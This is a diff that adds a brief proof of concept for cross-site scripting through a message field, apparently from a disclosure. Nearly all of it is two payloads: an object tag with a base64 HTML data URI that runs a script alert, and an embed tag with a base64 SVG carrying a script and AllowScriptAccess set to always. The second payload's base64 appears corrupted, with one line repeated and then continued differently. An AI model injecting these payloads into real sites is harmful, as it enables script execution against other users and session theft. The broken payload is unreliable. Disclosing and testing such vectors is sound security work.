@@ -1,0 +1,16 @@
+Proof of concept:
+In the message field a user could write:
+<object
+data='data:text/html;base64,PHNjcmlwdD5hbGVydCgid2Vic2VndXJhLm5ldC14c3MiKTwvc2NyaXB0
+Pg=='></object>
+
+or
+
+<embed
+src='data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc
+3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9y
+Zy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0
+ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIndlYnNlZ3VyYS5
+ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+uZXQgeHNzIik7PC9zY3
+JpcHQ+PC9zdmc+' type='image/svg+xml' AllowScriptAccess='always'></embed>
+
